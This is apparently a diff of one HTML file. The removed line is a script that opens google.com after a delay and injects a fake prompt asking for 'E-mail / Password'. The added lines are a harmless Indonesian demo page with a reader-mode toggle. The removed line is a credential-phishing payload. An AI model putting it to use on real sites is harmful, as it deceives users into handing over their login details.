@@ -1,1 +1,30 @@
-<script>function y(){x=open('http://www.google.com','_top'),x.document.body.innerHTML='<img/src=""onerror="setTimeout(function() {prompt(&quot;Sign into your account in order to access www.google.com&quot;, &quot;E-mail / Password&quot;)}, 150)">'};setTimeout(y, 3000); </script>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Artikel dengan Custom Reader Mode</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.6; max-width: 800px; margin: 0 auto; padding: 20px; }
+        .clutter { background: yellow; padding: 20px; margin: 20px 0; } /* Elemen distracting */
+        .reader-mode { background: #f9f9f9; color: #000; font-size: 1.2em; }
+        .reader-mode .clutter, .reader-mode header, .reader-mode nav, .reader-mode footer { display: none; }
+        #toggle-reader { position: fixed; bottom: 20px; right: 20px; padding: 10px; background: #4285f4; color: white; border: none; border-radius: 50%; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <header><h1>Header Situs (Iklan dll.)</h1></header>
+    <nav>Menu Navigasi</nav>
+    
+    <article>
+        <h1>Judul Artikel Panjang</h1>
+        <p>Paragraf panjang isi artikel... (konten utama)</p>
+        <div class="clutter">Iklan atau sidebar distracting</div>
+        <p>Paragraf lain...</p>
+    </article>
+    
+    <footer>Footer situs</footer>
+    
+    <button id="toggle-reader" onclick="document.body.classList.toggle('reader-mode')">📖</button>
+</body>
+</html>
